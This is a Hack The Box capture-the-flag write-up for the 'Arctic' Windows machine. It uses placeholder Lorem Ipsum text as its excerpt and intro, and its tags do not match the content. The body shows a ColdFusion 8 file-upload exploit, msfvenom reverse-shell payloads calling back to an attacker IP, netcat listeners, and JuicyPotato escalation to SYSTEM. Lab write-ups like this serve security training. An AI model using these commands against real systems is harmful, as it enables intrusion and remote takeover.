---
layout: single
title: Arctic - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-arctic/arctic_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-arctic/arctic_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:~]# nmap -Pn -n -sCV 10.10.10.11 --open
    PORT      STATE SERVICE VERSION
    135/tcp   open  msrpc   Microsoft Windows RPC
    8500/tcp  open  fmtp?
    49154/tcp open  msrpc   Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


  RPCCLIENT:
    -U "" = timeout


2. The port 8500 is unknown to me, so googling about it and I found a TCP port list, showing exploits from Shadowbrokers.
   Port 8500 is assigned for 'ColdFusion Macromedia/Adobe ColdFusion default Webserver port'.

   Continue to google about ColdFusion exploits and I find a python upload script, made by Arrexel from HTB.

    [root:/git/htb/arctic]# python coldFusion.py 10.10.10.11 8500 cmd.jsp                                                             (master✱)
      Sending payload...
      Successfully uploaded payload!
      Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp

    Command: whoami
      arctic\tolis

  The webshell is to unstable, so instead create a reverse payload to create a reverse shell.
    [root:/git/htb/arctic]# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=4488 -f raw > payload.jsp                   (master✱)
      Payload size: 1496 bytes

    [root:/git/htb/arctic]# python coldFusion.py 10.10.10.11 8500 payload.jsp                                                         (master✱)
      Sending payload...
      Successfully uploaded payload!
      Find it at http://10.10.10.11:8500/userfiles/file/payload.jsp

    [root:/git/htb/arctic]# rlwrap nc -lvnp 4488                                                                                      (master✱)
      listening on [any] 4488 ...
      connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49214
      Microsoft Windows [Version 6.1.7600]
      Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

      C:\ColdFusion8\runtime\bin> whoami
        arctic\tolis

      C:\Users\tolis\Desktop> type user.txt
        02650d3a69a70780c302e146a6cb96f3


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Check privs to see if we can abuse them.

  C:\Users\tolis\Desktop> whoami /priv

    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name                Description                               State
    ============================= ========================================= ========
    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
    SeImpersonatePrivilege        Impersonate a client after authentication Enabled
    SeCreateGlobalPrivilege       Create global objects                     Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

  We got 'SeImpersonatePrivilege', and since it's a 2008 machine JuicyPotato is allways an option.

  Start by creating your reverse payload:
    [root:/srv/pub-share]# msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.8 lport=4499 > arctic-privesc.bat
      [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
      [-] No arch selected, selecting arch: cmd from the payload
      No encoder specified, outputting raw payload
      Payload size: 1583 bytes

  Setup a SMB Server and copy JuicyPotato and .bat-file to the victim:
    [root:/srv/pub-share]# smbserver.py share .

    C:\tmp> copy \\10.10.14.8\share\JuicyPotato.exe .
            1 file(s) copied
    C:\tmp> copy \\10.10.14.8\share\arctic-privesc.bat .
            1 file(s) copied.

  Execute the exploit:
    C:\tmp> JuicyPotato.exe -l 1444 -p c:\Windows\System32\cmd.exe -a "/c C:\tmp\arctic-privesc.bat" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
      Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 1444
      ....
      [+] authresult 0
      {8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM

      [+] CreateProcessWithTokenW OK


    [root:/git/htb/arctic]# rlwrap nc -lvnp 4499                                                                                      (master✱)
      listening on [any] 4499 ...
      connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49269
      Microsoft Windows [Version 6.1.7600]
      Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

      C:\Windows/System32> whoami
        nt authority\system

      C:\Users\Administrator\Desktop> type root.txt
        ce65ceee66b2b5ebaff07e50508ffb90



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


Shadowbrokers port list:
  https://github.com/DonnchaC/shadowbrokers-exploits/blob/master/windows/Resources/Ep/Scripts/tcp_ports.txt

ColdFusion file upload:
  https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload
